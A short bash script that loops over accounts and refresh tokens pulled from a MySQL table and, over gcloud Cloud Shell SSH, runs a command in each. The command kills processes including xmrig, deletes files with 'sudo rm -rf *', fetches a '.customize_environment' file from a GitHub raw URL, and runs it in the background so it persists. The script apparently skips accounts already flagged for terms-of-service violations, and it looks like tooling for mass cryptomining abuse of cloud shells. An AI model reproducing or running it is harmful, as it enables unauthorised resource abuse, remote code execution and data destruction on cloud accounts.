#!/bin/bash

while read account refresh_token
do

echo
echo $account

command="echo 'ok' ; sudo pkill payload.sh ; sudo pkill xmrig ; sudo pkill ping.sh ; sudo pkill status.sh ;  sudo rm -rf * ; sudo rm -rf .customize_environment ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null &"

gcloud cloud-shell ssh --account=$account --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet

sleep 1

done < <(echo "select account , refresh_token from tbl_account where status <> 'TOS_VIOLATION' " | mysql --login-path=$home/config.cnf fenix -s)
